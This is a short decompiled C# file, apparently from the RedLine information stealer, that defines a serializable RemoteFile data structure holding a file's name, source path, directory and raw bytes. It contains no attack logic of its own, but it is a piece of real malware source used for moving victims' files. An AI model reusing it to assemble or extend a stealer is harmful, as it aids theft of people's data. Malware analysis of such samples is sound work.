using System;
using System.Runtime.Serialization;

namespace RedLine.Models
{
	// Token: 0x02000013 RID: 19
	[DataContract(Name = "RemoteFile", Namespace = "v1/Models")]
	public struct RemoteFile
	{
		// Token: 0x17000029 RID: 41
		// (get) Token: 0x06000071 RID: 113 RVA: 0x000034B9 File Offset: 0x000016B9
		// (set) Token: 0x06000072 RID: 114 RVA: 0x000034C1 File Offset: 0x000016C1
		[DataMember(Name = "FileName")]
		public string FileName { get; set; }

		// Token: 0x1700002A RID: 42
		// (get) Token: 0x06000073 RID: 115 RVA: 0x000034CA File Offset: 0x000016CA
		// (set) Token: 0x06000074 RID: 116 RVA: 0x000034D2 File Offset: 0x000016D2
		[DataMember(Name = "SourcePath")]
		public string SourcePath { get; set; }

		// Token: 0x1700002B RID: 43
		// (get) Token: 0x06000075 RID: 117 RVA: 0x000034DB File Offset: 0x000016DB
		// (set) Token: 0x06000076 RID: 118 RVA: 0x000034E3 File Offset: 0x000016E3
		[DataMember(Name = "Body")]
		public byte[] Body { get; set; }

		// Token: 0x1700002C RID: 44
		// (get) Token: 0x06000077 RID: 119 RVA: 0x000034EC File Offset: 0x000016EC
		// (set) Token: 0x06000078 RID: 120 RVA: 0x000034F4 File Offset: 0x000016F4
		[DataMember(Name = "FileDirectory")]
		public string FileDirectory { get; set; }
	}
}
